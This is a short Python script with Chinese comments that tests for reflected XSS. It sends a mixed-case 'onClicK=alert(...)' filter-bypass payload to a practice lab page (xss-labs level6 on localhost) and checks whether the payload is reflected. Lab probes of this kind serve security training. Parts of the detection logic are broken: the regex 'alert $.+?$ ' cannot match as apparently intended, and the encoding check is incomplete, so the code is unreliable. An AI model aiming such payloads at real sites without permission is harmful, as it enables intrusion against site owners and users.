import requests


def test_xss_poc(target_url, param_name, payload):
    """
    反射型XSS漏洞检测POC
    :param target_url: 目标URL（不含参数）
    :param param_name: 待测试的参数名
    :param payload: XSS测试payload
    :return: 漏洞存在返回True，否则False
    """
    # 构造恶意URL
    malicious_url = f"{target_url}?{param_name}={payload}"

    try:
        # 发送请求（CTF常用请求头设置）
        headers = {
            "User-Agent": "XSS-POC-Scanner/1.0",
            "Accept": "text/html"
        }
        response = requests.get(malicious_url, headers=headers, timeout=8)

        # 检测响应中是否包含原始payload（基础检测）
        if payload in response.text:
            return True

        # 进阶检测：HTML实体编码绕过
        if any(entity in response.text for entity in
               [payload.replace("<", "&lt;"), payload.replace(">", "&gt;")]):
            print("[!] 检测到过滤机制：HTML实体编码")
            return False

        # 响应内容分析（正则表达式检测）
        import re
        if re.search(r"alert $.+?$ ", response.text, re.IGNORECASE):
            return True

    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")

    return False


if __name__ == "__main__":
    # 配置检测参数（实际使用需替换）
    TARGET = "http://localhost/xss-labs-master/level6.php"  # 替换为目标URL
    PARAM = "keyword"  # 替换为实际参数名

    # 无害化payload（安全测试规范）
    PAYLOAD = "onClicK=alert('XSS_POC_安全测试')"  # 使用大小写混合绕过过滤

    # 执行检测
    if test_xss_poc(TARGET, PARAM, PAYLOAD):
        print(f"[+] 存在反射型XSS漏洞: {TARGET}?{PARAM}=[payload]")
    else:
        print("[-] 未检测到反射型XSS漏洞")
